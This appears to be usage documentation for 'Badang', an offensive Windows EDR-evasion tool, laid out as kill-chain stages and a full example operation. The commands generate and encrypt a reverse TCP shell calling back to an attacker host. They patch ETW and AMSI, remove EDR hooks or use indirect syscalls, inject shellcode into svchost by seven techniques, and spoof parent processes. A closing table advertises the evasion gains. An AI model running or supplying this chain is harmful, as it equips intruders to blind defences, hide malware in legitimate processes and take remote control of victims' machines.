# Badang in the Kill Chain

## Stages

```
1. Initial Access         — phishing, exploit, creds (not Badang)
2. Payload Generation     ← badang generate + encrypt
3. Telemetry Blinding     ← badang etw + amsi
4. Recon Target Process   ← badang analyze + scan
5. EDR Bypass             ← badang unhook / syscall --indirect
6. Injection              ← badang inject (7 techniques) + ppid
7. Runtime Evasion        ← badang sleep + spoof
8. Post-Exploitation      — C2, lateral movement (not Badang)
```

Badang covers stages 2–7: the full evasion chain from payload to runtime.

## Example Operation

```bash
# Step 1: Generate and encrypt a reverse shell payload
badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin
badang-cli encrypt --payload rev.bin --method rc4 --key "s3cret" -o encrypted.bin

# Step 2: Blind EDR telemetry
badang-cli etw -x -c                     # patch EtwEventWrite
badang-cli amsi -x -c                    # patch AmsiScanBuffer

# Step 3: Find a target process
badang-cli scan --filter svchost

# Step 4: Scan for hooks
badang-cli analyze --pid 1234 -x -c
# Result: NtCreateThreadEx HOOKED, NtWriteVirtualMemory HOOKED

# Step 5: Bypass the EDR
# Option A: Remove the hooks
badang-cli unhook --unhook NtCreateThreadEx -x -c
# Option B: Use indirect syscall (resolve SSN from ntdll, execute from ntdll gadget)
badang-cli syscall --func NtCreateThreadEx --indirect -x -c

# Step 6: Inject (pick a technique)
badang-cli inject --pid 1234 --technique createremote --payload encrypted.bin -x -c
badang-cli inject --pid 1234 --technique apc --payload encrypted.bin -x -c
badang-cli inject --pid 1234 --technique hijack --payload encrypted.bin -x -c
badang-cli inject --technique earlybird --payload encrypted.bin -x -c
badang-cli inject --pid 1234 --technique section --payload encrypted.bin -x -c
badang-cli inject --technique callback --payload encrypted.bin -x -c    # no thread creation
badang-cli inject --technique stomp --payload encrypted.bin -x -c       # hides in signed DLL

# Step 6b: Or spawn with spoofed parent + inject
badang-cli ppid --parent explorer.exe --child notepad.exe --suspended -x -c
# Then inject into the suspended child

# Step 7: Reverse shell connects back from svchost.exe
# Looks like normal system traffic to EDR and network monitors
```

## With vs Without Badang

| Without | With |
|---------|------|
| msfvenom payload → known signatures | Custom shellcode, no signatures |
| Inject blind → EDR catches API call | Analyze first, know what's watched |
| EDR hooks block you → operation fails | Unhook/Syscall bypasses hooks |
| Run as yourself → easy to find | Inject into legit process → blends in |
